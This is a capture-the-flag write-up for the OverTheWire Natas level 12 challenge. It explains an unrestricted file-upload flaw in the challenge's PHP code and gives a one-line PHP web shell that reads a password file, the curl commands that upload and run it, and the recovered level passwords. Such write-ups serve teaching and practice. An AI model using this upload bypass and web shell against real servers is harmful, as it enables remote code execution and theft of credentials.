---
category: natas
title: Natas12 - Code Injection Part 1
---

website: http://natas12.natas.labs.overthewire.org/ (password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3)

The following PHP code snippets are given in natas12:
{% highlight php linenos %}
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";   
 
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
 
    return $string;
}
 
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
 
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
 
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
 
 
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
}
 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
<input name="uploadedfile" type="file" /><br />
{% endhighlight %}

From the above code snippets, we have following observations:
1. The uploaded filename is random generated on the server side. The file extension, however, is from the client side, which is <small>.jpg</small>. We can manipulate the file extension in our request and force the web server to use our file extension, e.g., <small>.php</small>.
2. The uploaded file is stored on the server and a random URL is generated. We can visit the stored file by following the generated URL.

To crack this challenge, we can upload a PHP file and maintain its file extension using curl. That way we will have a PHP stored on the server and execute whatever we implement in that PHP file by visiting the generated PHP page.

The PHP file and the curl command is given below. The response is also given.

```shell
$ cat natas12.php
<?php echo system("cat /etc/natas_webpass/natas13"); ?>


$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/index.php   -F "filename=natas12.php"  -F "uploadedfile=@natas12.php"
<html>
... <content skipped>

The file <a href="upload/s46d60cuag.php">upload/s46d60cuag.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

... <content skipped>
</html>


$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/upload/s46d60cuag.php
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

The last curl command revealed the password for natas13.

<strong>LESSONS LEARNED</strong>

This challenge is about code injection and remote code execution. There are several reasons making our attack possible:
1. The web application didn't validate a user's input. Instead, the file extension saved on the server came from the user input. As a result, the uploaded file was saved as a PHP
   script on the server.
2. After a file is saved on the server, it didn't have any permission restriction on the file. As a result, the PHP script was executed on the server whenever a user had accessed it.

